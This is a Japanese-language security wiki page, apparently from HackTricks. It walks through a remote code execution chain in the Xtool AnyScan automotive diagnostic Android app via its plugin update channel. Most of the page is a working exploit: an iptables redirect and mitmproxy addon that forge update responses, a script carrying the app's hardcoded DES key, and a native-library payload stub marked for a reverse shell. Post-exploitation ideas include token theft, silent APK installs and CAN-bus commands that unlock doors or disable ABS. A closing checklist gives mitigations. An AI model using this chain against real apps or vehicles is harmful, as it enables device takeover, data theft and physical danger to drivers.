# Insecure In-App Update Mechanisms – Remote Code Execution via Malicious Plugins

{{#include ../../banners/hacktricks-training.md}}

多くのAndroidアプリケーションは、Google Playストアを使用する代わりに**独自の「プラグイン」または「動的機能」アップデートチャネル**を実装しています。 実装が不安全な場合、トラフィックを傍受できる攻撃者は、**アプリプロセス内にロードされる任意のネイティブコードを提供することができ**、これによりハンドセット上での完全なリモートコード実行（RCE）につながります。場合によっては、アプリが制御する外部デバイス（車両、IoT、医療機器など）でも同様です。

このページでは、Xtool **AnyScan**自動車診断アプリ（v4.40.11 → 4.40.40）で発見された実際の脆弱性チェーンを要約し、他のAndroidアプリを監査し、レッドチームのエンゲージメント中に誤設定を武器化できるように技術を一般化します。

---
## 1. 不安全なTLS TrustManagerの特定

1. jadx / apktoolを使用してAPKを逆コンパイルし、ネットワーキングスタック（OkHttp、HttpUrlConnection、Retrofitなど）を特定します。
2. すべての証明書を盲目的に信頼する**カスタム`TrustManager`**または`HostnameVerifier`を探します：
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. 存在する場合、アプリケーションは**任意のTLS証明書**を受け入れます → 自己署名証明書を使用して透明な**MITMプロキシ**を実行できます:
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. アップデートメタデータのリバースエンジニアリング

AnyScanの場合、各アプリの起動は次のHTTPS GETをトリガーします:
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
レスポンスボディは、`<FileData>`ノードがすべての利用可能なプラグインを記述した**Base64エンコードされた、DES-ECB暗号化された**JSONを含む**XMLドキュメント**です。

典型的なハンティングステップ：
1. 暗号化ルーチン（例：`RemoteServiceProxy`）を特定し、以下を回復します：
* アルゴリズム（DES / AES / RC4 …）
* 動作モード（ECB / CBC / GCM …）
* ハードコーディングされたキー / IV（通常は定数内の56ビットDESキーまたは128ビットAESキー）
2. メタデータを復号化/暗号化するために、Pythonで関数を再実装します：
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. 悪意のあるプラグインを作成する

1. 任意の正当なプラグインZIPを選択し、ネイティブライブラリをあなたのペイロードで置き換えます:
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. JSONメタデータを更新して、`"FileName" : "PWNED.zip"` と `"DownloadURL"` があなたのHTTPサーバーを指すようにします。  
3. 修正したJSONをDESで暗号化し、Base64でエンコードして、インターセプトしたXMLの中に戻します。

## 4. mitmproxyでペイロードを配信する

`addon.py`の例は、*静かに*元のメタデータを入れ替えます:
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
悪意のあるZIPをホストするためにシンプルなウェブサーバーを実行します:
```bash
python3 -m http.server 8000 --directory ./payloads
```
被害者がアプリを起動すると、以下のことが行われます：
* MITMチャネルを介して偽造されたXMLを取得します；
* ハードコーディングされたDESキーでそれを復号化し、解析します；
* `PWNED.zip`をダウンロードし、プライベートストレージ内に解凍します；
* 含まれている*libscan_x64.so*を`dlopen()`し、アプリの権限（カメラ、GPS、Bluetooth、ファイルシステムなど）でコードを即座に実行します。

プラグインはディスクにキャッシュされるため、バックドアは**再起動を跨いで持続**し、ユーザーが関連する機能を選択するたびに実行されます。

## 5. ポストエクスプロイトのアイデア

* アプリによって保存されたセッションクッキー、OAuthトークン、またはJWTを盗む。
* 第二段階のAPKをドロップし、`pm install`を介して静かにインストールする（アプリはすでに`REQUEST_INSTALL_PACKAGES`を持っています）。
* 接続されたハードウェアを悪用する – AnyScanシナリオでは、任意の**OBD-II / CANバスコマンド**を送信できます（ドアのロック解除、ABSの無効化など）。

---
### 検出と緩和チェックリスト（ブルーチーム）

* 証明書の検証を無効にするカスタムTrustManager/HostnameVerifierを持つプロダクションビルドを絶対に出荷しないでください。
* Google Playの外部から実行可能なコードをダウンロードしないでください。もし*必須*の場合は、各プラグインを同じ**apkSigning v2**キーで署名し、読み込む前に署名を検証してください。
* 弱い/ハードコーディングされた暗号を**AES-GCM**とサーバー側のローテーションキーに置き換えます。
* ダウンロードしたアーカイブの整合性を検証します（署名または少なくともSHA-256）。

---
## 参考文献

- [NowSecure – Remote Code Execution Discovered in Xtool AnyScan App](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – Unsafe TrustManager patterns](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
